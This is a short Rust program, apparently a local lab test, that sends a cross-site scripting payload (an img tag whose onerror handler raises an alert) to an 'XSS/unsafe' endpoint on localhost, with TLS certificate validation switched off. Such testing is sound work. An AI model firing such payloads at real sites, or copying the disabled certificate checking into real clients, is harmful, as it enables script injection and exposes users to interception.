use reqwest::Client;
use std::path::Path;

#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    let bytes = tokio::fs::read(Path::new("./SSL/Cert/ca_cert.pem")).await?;
    let client = Client::builder()
        .add_root_certificate(reqwest::Certificate::from_pem(&bytes)?).danger_accept_invalid_certs(true)
        .build()?;
    let response = client.post("https://127.0.0.1:8443/XSS/unsafe").body("<img src=\"invalid-url\" onerror=\"alert(\'You have been XSS attacked\')\">").send().await?;
    println!("{}", response.text().await?);
    Ok(())
}
